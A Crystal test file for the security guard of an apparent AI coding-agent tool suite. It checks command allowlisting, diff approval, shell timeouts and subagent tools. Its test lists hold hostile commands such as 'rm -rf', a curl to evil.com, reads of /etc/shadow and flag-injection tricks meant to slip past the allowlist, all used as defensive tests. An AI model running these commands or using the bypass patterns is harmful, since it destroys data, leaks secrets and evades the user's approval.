# spec/tools_spec.cr
require "./spec_helper"

describe "Nightmare Tools Suite & Security Boundaries" do
  describe "allowlist bypass corpus (T8)" do
    it "forces interactive modal or fails tokenization for all injection patterns" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        allowlist = Nightmare::Tools::Allowlist.new

        # User has allowed "git status" and "crystal spec"
        allowlist.allow_session_prefix(["git", "status"])
        allowlist.allow_session_prefix(["crystal", "spec"])
        allowlist.allow_session_prefix(["ls"])

        # Base case: genuine "git status" is auto-approvable
        argv_clean = Nightmare::Tools::Allowlist.tokenize("git status")
        allowlist.auto_approvable?("git status", argv_clean).should be_true

        bypass_attempts = [
          "git -c core.sshCommand=malicious status",
          "git --exec-path=/tmp status",
          "find . -exec sh -c 'whoami' \\;",
          "xargs rm -rf",
          "env FOO=1 sh",
          "python -c 'import os; os.system(\"id\")'",
          "FOO=$(id) git status",
          "git status; rm -rf ~",
          "git status && curl http://evil.com",
          "git status | grep foo",
          "git status > /tmp/out",
          "git status `id`",
          "git status\nrm -rf .",
        ]

        bypass_attempts.each do |cmd|
          failed_tokenization = false
          argv = begin
            Nightmare::Tools::Allowlist.tokenize(cmd)
          rescue
            failed_tokenization = true
            [] of String
          end

          # If it succeeded tokenization, it MUST NOT auto-approve!
          unless failed_tokenization
            is_auto = allowlist.auto_approvable?(cmd, argv)
            is_auto.should be_false, "Bypass command '#{cmd}' unexpectedly auto-approved!"
          end
        end
      end
    end
  end

  describe "read-only tools" do
    it "lists files excluding git, nightmare, and sensitive files" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        tools = Nightmare::Tools::ReadOnly.new(guard)

        # Create sample workspace
        File.write(File.join(root, "app.cr"), "puts 'app'")
        File.write(File.join(root, ".env"), "SECRET=1")
        Dir.mkdir_p(File.join(root, ".git"))
        File.write(File.join(root, ".git", "config"), "git")
        Dir.mkdir_p(File.join(root, ".nightmare"))
        File.write(File.join(root, ".nightmare", "prompt.md"), "prompt")

        output = tools.list_files
        output.should contain("app.cr")
        output.should_not contain(".env")
        output.should_not contain(".git")
        output.should_not contain(".nightmare")
      end
    end

    it "searches file contents with pattern matching" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        tools = Nightmare::Tools::ReadOnly.new(guard)

        File.write(File.join(root, "foo.txt"), "hello world\nneedle here\ngoodbye")
        File.write(File.join(root, "bar.txt"), "nothing special")

        result = tools.search("needle")
        result.should contain("foo.txt:2: needle here")
        result.should_not contain("bar.txt")
      end
    end

    it "reads file lines with offset and limit" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        tools = Nightmare::Tools::ReadOnly.new(guard)

        File.write(File.join(root, "lines.txt"), "one\ntwo\nthree\nfour\nfive")

        result = tools.read_file("lines.txt", offset: 2, limit: 2)
        result.should contain("2 | two")
        result.should contain("3 | three")
        result.should_not contain("1 | one")
        result.should_not contain("4 | four")
      end
    end

    it "returns file metadata via file_info" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        tools = Nightmare::Tools::ReadOnly.new(guard)

        File.write(File.join(root, "info.txt"), "abc\ndef\n")
        json_str = tools.file_info("info.txt")
        json = JSON.parse(json_str)

        json["path"].as_s.should eq("info.txt")
        json["directory"].as_bool.should be_false
        json["lines"].as_i.should eq(2)
      end
    end
  end

  describe "mutation tools and diff approval" do
    it "auto-approves creation of a new file without prompt" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        effects = [] of String
        mutation = Nightmare::Tools::Mutation.new(guard)
        mutation.active_side_effects = effects

        res = mutation.write_file("new_file.txt", "Hello new file")
        res.should contain("Successfully wrote")
        File.read(File.join(root, "new_file.txt")).should eq("Hello new file")
        effects.should contain("new_file.txt")
      end
    end

    it "requires diff approval before overwriting an existing file" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        file_path = File.join(root, "existing.txt")
        File.write(file_path, "Original line\n")

        # Approval handler rejecting mutation
        approved = false
        received_diff = ""
        handler = ->(diff : String, desc : String) {
          received_diff = diff
          approved
        }

        mutation = Nightmare::Tools::Mutation.new(guard, handler)

        # First try: rejected
        res = mutation.write_file("existing.txt", "Overwritten line\n")
        res.should eq("[Execution rejected by user]")
        File.read(file_path).should eq("Original line\n")
        received_diff.should contain("-Original line")
        received_diff.should contain("+Overwritten line")

        # Second try: approved
        approved = true
        res2 = mutation.write_file("existing.txt", "Overwritten line\n")
        res2.should contain("Successfully wrote")
        File.read(file_path).should eq("Overwritten line\n")
      end
    end

    it "replaces unique target string in file with diff approval" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        file_path = File.join(root, "code.cr")
        File.write(file_path, "def run\n  old_code\nend\n")

        handler = ->(_diff : String, _desc : String) { true }
        mutation = Nightmare::Tools::Mutation.new(guard, handler)

        res = mutation.replace_in_file("code.cr", "old_code", "new_code")
        res.should contain("Successfully replaced")
        File.read(file_path).should eq("def run\n  new_code\nend\n")
      end
    end
  end

  describe "shell execution and process group supervision" do
    it "terminates command on timeout via process group (T9)" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        allowlist = Nightmare::Tools::Allowlist.new

        # Approve sleep
        allowlist.allow_session_prefix(["sleep"])

        shell = Nightmare::Tools::Shell.new(guard, allowlist)

        # Timeout after 1 second for a 10s sleep
        start_time = Time.instant
        result = shell.run_command("sleep 10", timeout_seconds: 1)
        elapsed = Time.instant - start_time

        result.should contain("[Execution timed out after 1 seconds]")
        elapsed.total_seconds.should be < 5.0
      end
    end

    it "does not deadlock when draining large output on both pipes (T10)" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        allowlist = Nightmare::Tools::Allowlist.new

        # Python command writing > 70KB to stdout and stderr
        allowlist.allow_session_prefix(["python3"])
        script_file = File.join(root, "chatty.py")
        File.write(script_file, <<-PY
import sys
data = "A" * 70000
sys.stdout.write(data)
sys.stdout.flush()
sys.stderr.write(data)
sys.stderr.flush()
PY
        )

        shell = Nightmare::Tools::Shell.new(guard, allowlist)
        result = shell.run_command("python3 chatty.py", timeout_seconds: 5)

        # Finished without deadlocking, capped output
        result.should contain("[... stream truncated at")
        result.should contain("STDERR:")
      end
    end
  end

  describe "subagent delegation (spawn_subagent)" do
    it "includes spawn_subagent in primary tools and omits it from subagent tools" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        client = FakeClient.new
        runner = Nightmare::Harness::SubagentRunner.new(client, env)
        registry = Nightmare::Tools::Registry.new(guard, client, subagent_runner: runner)

        primary_names = registry.build_tools.map(&.function.name)
        primary_names.should contain("spawn_subagent")
        primary_names.should_not contain("ask_model")

        subagent_names = registry.build_subagent_tools.map(&.function.name)
        subagent_names.should_not contain("spawn_subagent")
        subagent_names.should_not contain("ask_model")
      end
    end

    it "returns error when no subagent runner is configured" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        client = FakeClient.new
        registry = Nightmare::Tools::Registry.new(guard, client)

        tool = registry.build_tools.find { |t| t.function.name == "spawn_subagent" }
        tool.should_not be_nil

        result = tool.not_nil!.execute({"task" => JSON::Any.new("investigate something")})
        result.should contain("[Subagent error: No subagent runner configured]")
      end
    end

    it "delegates subtask to subagent runner and formats output" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        client = FakeClient.new([
          Mantle::Clients::Response.new(content: "[SUMMARY]\nFound 3 occurrences of issue", tool_calls: nil)
        ])
        runner = Nightmare::Harness::SubagentRunner.new(client, env)
        registry = Nightmare::Tools::Registry.new(guard, client, subagent_runner: runner)

        tool = registry.build_tools.find { |t| t.function.name == "spawn_subagent" }
        result = tool.not_nil!.execute({"task" => JSON::Any.new("check code")})

        result.should contain("[Subagent completed - 0 tool calls]")
        result.should contain("Found 3 occurrences of issue")
      end
    end

    it "encapsulates runner exceptions into result string" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        client = FakeClient.new
        client.raise_on_call[1] = Exception.new("Connection refused")

        runner = Nightmare::Harness::SubagentRunner.new(client, env)
        result = runner.run_subagent("Investigate network issue")
        result.should contain("[Subagent error: ClientFailure]")
      end
    end
  end

  describe "hardened security boundaries and vulnerability mitigations" do
    it "isolates parent process environment and prevents secret leakage (VULN-01)" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        allowlist = Nightmare::Tools::Allowlist.new
        allowlist.allow_session_prefix(["printenv"])

        ENV["NIGHTMARE_TEST_SECRET"] = "super_secret_token_12345"
        begin
          shell = Nightmare::Tools::Shell.new(guard, allowlist)
          result = shell.run_command("printenv NIGHTMARE_TEST_SECRET", timeout_seconds: 2)
          result.should_not contain("super_secret_token_12345")
        ensure
          ENV.delete("NIGHTMARE_TEST_SECRET")
        end
      end
    end

    it "rejects single-dash -exec, bundled flags, and attached options in flag denylist (VULN-05)" do
      denylist_attempts = [
        ["find", ".", "-exec", "whoami", "+"],
        ["find", ".", "-execdir", "ls", ";"],
        ["find", ".", "-ok", "sh", ";"],
        ["git", "-C/etc", "status"],
        ["git", "-c=foo", "status"],
        ["git", "fetch", "--upload-pack=evil"],
        ["perl", "-ne", "print"],
        ["perl", "-pe", "exec"],
        ["bash", "-ec", "whoami"],
        ["ruby", "-we", "puts 1"],
        ["python3", "-cprint(1)"],
        ["env", "FOO=BAR", "sh"],
      ]

      denylist_attempts.each do |argv|
        Nightmare::Tools::Allowlist.has_denylisted_flags?(argv).should be_true, "Expected #{argv.inspect} to hit flag denylist"
      end
    end

    it "bans carriage returns, glob wildcards, and tilde expansions in metacharacter checks (VULN-03, VULN-08)" do
      metachar_cmds = [
        "git status\r",
        "cat /???/??ss??",
        "ls [a-z]",
        "cat ~/secret",
        "echo # comment",
        "echo \e[2K",
      ]

      metachar_cmds.each do |cmd|
        Nightmare::Tools::Allowlist.contains_metacharacters?(cmd).should be_true, "Expected '#{cmd}' to contain metacharacters"
      end
    end

    it "restricts operand prefix approvals and prevents trailing file exfiltration (VULN-04)" do
      allowlist = Nightmare::Tools::Allowlist.new

      # Approving prefix on an operand-based utility (cat) saves exact command, not open prefix
      allowlist.allow_session_prefix(["cat", "PROGRESS.md"])

      # Genuine command is allowed
      allowlist.auto_approvable?("cat PROGRESS.md", ["cat", "PROGRESS.md"]).should be_true

      # Trailing file exfiltration attempt is blocked
      allowlist.auto_approvable?("cat PROGRESS.md /etc/shadow", ["cat", "PROGRESS.md", "/etc/shadow"]).should be_false
      allowlist.auto_approvable?("cat /etc/shadow", ["cat", "/etc/shadow"]).should be_false

      # Subcommand utility (git) allows subcommands
      allowlist.allow_session_prefix(["git", "status"])
      allowlist.auto_approvable?("git status", ["git", "status"]).should be_true
      allowlist.auto_approvable?("git status -s", ["git", "status", "-s"]).should be_true
      allowlist.auto_approvable?("git checkout", ["git", "checkout"]).should be_false
    end

    it "atomically preserves regex patterns and exact rules during save_persistent (VULN-09)" do
      with_temp_dir do |root|
        allow_file = File.join(root, "allow")
        File.write(allow_file, "prefix:git status\n^crystal spec.*$\nls -la\n")

        allowlist = Nightmare::Tools::Allowlist.new(allow_file)
        allowlist.allow_persist_exact(["echo", "hello"])

        content = File.read(allow_file)
        content.should contain("prefix:git status")
        content.should contain("^crystal spec.*$")
        content.should contain("ls -la")
        content.should contain("echo hello")
      end
    end

    it "re-validates edited commands through loop before execution (VULN-10)" do
      with_temp_dir do |root|
        env = Nightmare::Workspace::Environment.new(root, ensure_dirs: false)
        guard = Nightmare::Tools::Guard.new(env)
        allowlist = Nightmare::Tools::Allowlist.new

        call_count = 0
        handler = ->(cmd : String, argv : Array(String), has_meta : Bool, timeout : Int32) {
          call_count += 1
          if call_count == 1
            # First prompt: edit to a dangerous command with metacharacters
            {Nightmare::Tools::ApprovalOutcome::Edit, "git status; rm -rf /"}
          else
            # Second prompt: verified that dangerous edit was intercepted
            {Nightmare::Tools::ApprovalOutcome::No, nil.as(String?)}
          end
        }

        shell = Nightmare::Tools::Shell.new(guard, allowlist, approval_handler: handler)
        result = shell.run_command("git status")

        call_count.should eq(2)
        result.should eq("[Execution rejected by user]")
      end
    end
  end
end

